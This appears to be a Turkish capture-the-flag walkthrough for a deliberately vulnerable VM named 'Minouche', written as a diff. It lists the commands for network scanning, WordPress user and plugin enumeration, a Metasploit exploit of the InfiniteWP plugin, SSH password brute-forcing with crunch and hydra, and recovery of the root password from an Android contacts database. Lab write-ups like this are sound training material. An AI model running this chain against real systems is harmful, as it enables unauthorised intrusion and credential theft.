@@ -1,0 +1,17 @@
+MINOUCHE MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet veya VM'in açılış ekranında IP yazıyor. 192.168.2.85
+2 - nmap -sT -A 192.168.2.85
+3 - gobuster dir -u http://192.168.2.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - Wordpress keşfedildi.
+5 - wpscan --url 192.168.2.85 -e u, kitty kullanıcısı bulundu.
+6 - wpscan --url 192.168.2.85 -e u,p --plugins-detection aggressive, InfiniteWP plugini keşfedildi.
+7 - metasploit, search infinitewp payloadını kullanarak bir meterpreter bağlantısı elde ettik.
+8 - cd /, cat kitty.txt şifre hakkında bir ipucu verdi.
+9 - crunch 13 13 -t '$'Minouche20%% -o kitty_1.txt
+10 - hydra -l kitty -P /home/alper/Downloads/kitty_1.txt ssh://192.168.2.85
+11 - ssh şifresi $Minouche2005 bulunur.
+12 - ssh kitty@192.168.2.85, unzip android.zip
+13 - scp kitty@192.168.2.85:/home/kitty/android.zip /home/alper/Downloads
+14 - chmod +r android.zip, unzip android.zip, cd data/data/com.android.providers.contacts/databases
+15 - contacts2.db yi SQLite Browser ile açıyoruz.
+16 - YouWillNeverGue$$This = root password
